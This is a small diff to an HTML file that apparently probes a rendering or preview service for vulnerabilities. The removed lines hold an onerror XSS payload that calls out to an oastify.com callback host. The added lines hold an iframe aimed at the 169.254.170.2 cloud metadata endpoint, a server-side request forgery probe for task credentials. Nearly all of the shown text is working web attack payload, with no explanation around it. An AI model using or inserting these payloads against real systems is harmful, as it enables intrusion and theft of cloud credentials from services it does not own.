@@ -26,7 +26,5 @@ Hello
   };
 </script>
 
-
-
-<img src="image.png", onerror="setTimeout(function(){var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://dyfszgzhmux0g3q4fwhvlw5ualgc44st.oastify.com', true); xhr.send();}, 1000);">
-
+7th
+<iframe src="http://169.254.170.2/v2/metadata" width="800" height="600">
